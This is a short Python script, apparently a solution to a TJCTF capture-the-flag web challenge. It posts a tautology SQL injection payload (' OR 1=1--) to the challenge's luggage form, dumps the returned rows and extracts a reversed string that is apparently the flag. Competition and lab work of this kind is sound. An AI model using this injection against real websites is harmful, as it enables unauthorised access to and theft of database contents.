#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-27 22:23:29
# @Last Modified by:   john
# @Last Modified time: 2016-05-27 22:36:23

import requests
import re

url = 'http://super-questionable-luggage.p.tjctf.org/'

s = requests.Session()

response = s.post(url, data = { 'get-luggage' : "' OR 1=1--" })
given =  re.findall('You asked for multiple items. Here are the items I have recieved: \[(.*)\]', response.text)[0]
specific_item =  re.findall("\(12468,.*?\)", given)[0]

print specific_item.split('&#39;')[1][::-1]